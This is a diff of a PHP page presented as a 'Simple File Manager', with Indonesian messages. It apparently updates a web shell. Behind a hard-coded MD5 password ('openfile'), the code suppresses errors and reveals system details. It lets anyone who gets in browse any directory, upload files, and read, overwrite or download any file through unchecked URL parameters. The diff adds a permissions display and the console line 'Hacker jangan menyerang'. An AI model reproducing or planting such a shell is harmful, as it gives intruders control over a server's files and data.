@@ -3,51 +3,37 @@
 <head>
 	<title>Simple File Manager</title>
 </head>
-<body>
-	
+<body>	
 	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
-
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.6.3/css/all.min.css"  />
-
 	<script type="text/javascript">
-
 		function addUrlParameter(nama, value){
 			var newURL = location.href.split("?search")[0];
 			window.history.pushState('object',document.title,newURL);
-
 			var searchParams = new URLSearchParams(window.location.search)
-			searchParams.set(nama,value)
-			
+			searchParams.set(nama,value)			
 			window.location.search = searchParams.toString()
-
 		}
 
 		function deleteFile(nama, value){
-
 			if (confirm("Yakin Delete!") == true) {
 				addUrlParameter(nama,value);
 			} else {
 				console.log('cancel');
 			}
-
 		}
-
-
+		console.log('Hacker jangan menyerang !!')
 	</script>
 
 	<?php
-
 	error_reporting(0);
 	session_start();
 	// session_destroy();
 	
-
 	$password = "b68b70b4fa5d1aa81292d4ceb48fcca7"; //md5 : openfile
 	
-	if (isset($_POST['password'])) {
-		
+	if (isset($_POST['password'])) {		
 		$_SESSION['password'] = md5($_POST['password']);
-
 	}
 
 	if (strval($_SESSION['password'])!=$password) {
@@ -56,11 +42,8 @@
 		die();
 	}
 
-
-
 	echo 'User Agent: '.$_SERVER['HTTP_USER_AGENT'];
 	echo "<br>";
-
 
 	function path() {
 		if(isset($_GET['dir'])) {
@@ -71,6 +54,7 @@
 		}
 		return $dir;
 	}
+
 	function windisk() {
 		$letters = "";
 		$v = explode("\\", path());
@@ -79,7 +63,7 @@
 			$bool = $isdiskette = in_array($letter, array("A"));
 			if(!$bool) $bool = is_dir("$letter:\\");
 			if($bool) {
-				$letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
+				$letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Pastikan disket dimasukkan dengan benar, jika tidak, kesalahan dapat terjadi.')\"":"").">";
 				if($letter.":" != $v) {
 					$letters .= $letter;
 				}
@@ -104,22 +88,24 @@
 			}
 		}
 	}
+
 	function OS() {
 		return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
+	}
+
+	function getFilePermission($file) {
+		$length = strlen(decoct(fileperms($file)))-3;
+		return substr(decoct(fileperms($file)),$length);
 	}
 
 	if (isset($_GET['act'])) {
 		if ($_GET['act']=="download") {
 			@ob_clean();
-
 			$file_path = $_GET['dir'].$_GET['f'];
-			$filename = $_GET['f'];
-			
-
+			$filename = $_GET['f'];	
 			header('Content-Description: File Transfer');
 			header('Content-Type: application/octet-stream');
 			header('Content-Disposition: attachment; filename="'.basename($file).'"');
-
 			header("Content-Type: application/octet-stream");
 			header("Content-Transfer-Encoding: Binary");
 			header("Content-disposition: attachment; filename=\"".$filename."\""); 
@@ -139,8 +125,6 @@
 		}
 	}
 
-
-
 	echo "<br>";
 	echo "OS : ".OS();
 	echo ' <b>('.php_uname().')</b>';
@@ -152,6 +136,7 @@
 		if(@copy($_FILES['file']['tmp_name'], $_GET['dir'].$_FILES['file']['name'])) { echo '<b>Upload Sukses Ngab !!!</b><br><br>'; }
 		else { echo '<b>JANCOO** !!! Upload GAGAL !!!</b><br><br>'; }
 	}
+
 	echo "</div>";
 	echo "<br>";
 	echo windisk();
@@ -172,49 +157,42 @@
 			$direktori = $value.'/';
 		}
 
-
 		echo '<a href="?dir='.$direktori.'/">'.$value.'</a>/';
 	}
 
-
+//Display directory and file
 	$dir = path();	
 
 	echo '<ul class="list-group list-group-flush">';
-
 	$variable = (scandir($dir));
 	foreach ($variable as $key => $value) {
-
 		if (is_dir($value)) {
-			echo '<li class="list-group-item d-flex justify-content-between align-items-center" ><a href="?dir=' .path().'/'.$value."/".'"><i class="fas fa-folder-close"></i>'.$value.'</a></li>';
+			echo '<li class="list-group-item d-flex justify-content-between align-items-center" ><a href="?dir=' .path().'/'.$value."/".'"><i class="fas fa-folder-close"></i>'.$value.'</a>
+			<span class="badge badge-primary badge-pill">'.getFilePermission($_GET['dir'].$value).'</span>
+			</li>';
 		}
 	}
 
 	foreach ($variable as $key => $value) {
 		if (!is_dir($value)) {
-			echo '<li class="list-group-item d-flex justify-content-between align-items-center" ><a style="cursor: pointer;" onclick="addUrlParameter('."'f','" .$value."'".')"><i class="fas fa-file-alt"></i>'.$value.'</a></li>';
+			echo '<li class="list-group-item d-flex justify-content-between align-items-center" ><a style="cursor: pointer;" onclick="addUrlParameter('."'f','" .$value."'".')"><i class="fas fa-file-alt"></i>'.$value.'</a>
+			<span class="badge badge-primary badge-pill">'.getFilePermission($_GET['dir'].$value).'</span>
+			</li>';			
 		}
 	}
-
 	echo "</ul>";
 
-
-
-
-
+//Display File Option EDIT,DOWNLOAD,DELETE
 	if (isset($_GET['f'])) {
-
 		if (isset($_POST['code'])) {
 			$file = fopen($_GET['f'],"w");
 			fwrite($file,$_POST['code']);
 			fclose($file);
 		}
-
 		echo '<div class="card card-body"><form method="POST">';
-
 		$myfile = fopen($_GET['dir'].$_GET['f'], "r") or die("Unable to open file!");
 		echo '<textarea name="code" class="form-control" rows="20" autofocus>'.htmlspecialchars(fread($myfile,filesize($_GET['dir'].$_GET['f']))).'</textarea>';
 		fclose($myfile);
-
 		echo '<div class="col-sm-4"><input type="submit" class="btn btn-primary" name="" value="Edit"/></div>
 		</form> 
 		<div class="col-sm-4"><button class="btn btn-success" onclick="addUrlParameter('."'act','download'".')">Download</button>
@@ -223,7 +201,7 @@
 	}
 
 	?>
-
-
+	<br>
+	<div style="position:fixed;left: 0;bottom: 0;width:100%; background-color: white;text-align: center;"><b>Copyright@<?=date('Y')?> Peluru Kertas</b></div>
 </body>
 </html>
